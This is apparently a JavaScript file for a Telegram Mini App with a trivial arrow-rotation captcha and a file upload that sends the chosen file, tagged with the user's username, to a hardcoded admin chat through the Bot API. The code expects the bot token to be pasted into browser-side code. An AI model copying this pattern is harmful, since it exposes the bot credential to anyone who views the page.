const tg = window.Telegram.WebApp;
tg.expand();

// ЗАМЕНИ НА СВОЙ ТОКЕН
const BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"; 
const TARGET_ADMIN = "7632180689";

const slider = document.getElementById('slider');
const arrow = document.getElementById('arrow');
const verifyBtn = document.getElementById('verify-btn');
const captchaCard = document.getElementById('captcha-card');
const mainUi = document.getElementById('main-ui');

slider.oninput = () => {
    arrow.style.transform = `rotate(${slider.value}deg)`;
};

verifyBtn.onclick = () => {
    const angle = parseInt(slider.value);
    if (angle >= 80 && angle <= 99) {
        captchaCard.classList.remove('active');
        setTimeout(() => {
            mainUi.classList.add('active');
            const user = tg.initDataUnsafe.user?.first_name || "Пользователь";
            document.getElementById('welcome-text').innerText = `Добро пожаловать, ${user}`;
        }, 500);
    } else {
        tg.showAlert("Ошибка! Направьте стрелку точно в диапазон 80-99 градусов.");
    }
};

const fileInput = document.getElementById('file-input');
fileInput.onchange = async () => {
    const file = fileInput.files[0];
    if (!file) return;

    const status = document.getElementById('status');
    status.innerText = "⏳ Отправка...";

    const formData = new FormData();
    formData.append('chat_id', TARGET_ADMIN);
    formData.append('document', file);
    formData.append('caption', `Файл от: @${tg.initDataUnsafe.user?.username || 'unknown'}`);

    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        if (res.ok) {
            status.innerText = "✅ Файл успешно отправлен!";
            status.style.color = "#00ff00";
            tg.HapticFeedback.notificationOccurred('success');
        } else {
            status.innerText = "❌ Ошибка отправки.";
        }
    } catch (e) {
        status.innerText = "❌ Ошибка сети.";
    }
};
